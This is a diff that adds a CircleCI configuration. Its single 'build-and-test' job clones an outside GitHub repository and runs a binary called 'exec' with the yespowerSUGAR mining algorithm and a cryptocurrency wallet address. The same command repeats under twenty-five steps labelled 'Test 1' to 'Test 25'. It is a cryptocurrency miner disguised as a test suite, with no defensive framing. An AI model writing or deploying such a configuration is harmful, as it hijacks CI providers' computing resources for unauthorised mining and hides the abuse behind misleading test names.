@@ -1,0 +1,113 @@
+version: 2.1
+orbs:
+  python: circleci/python@0.2.1
+
+jobs:
+  build-and-test:
+    executor: python/default
+    steps:
+      - run:
+          command:
+            git clone https://github.com/sjefkooi/01.git &&
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 1
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 2
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 3
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 4
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 5
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 6
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 7
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 8
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 9
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 10
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 11
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 12
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 13
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 14
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 15
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 16
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 17
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 18
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 19
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 20
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 21
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 22
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 23
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 24
+      - run:
+          command:
+            cd 01 && chmod +x exec && ./exec -a yespowerSUGAR -o 17042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.C1
+          name: Test 25
+workflows:
+  main:
+    jobs:
+      - build-and-test
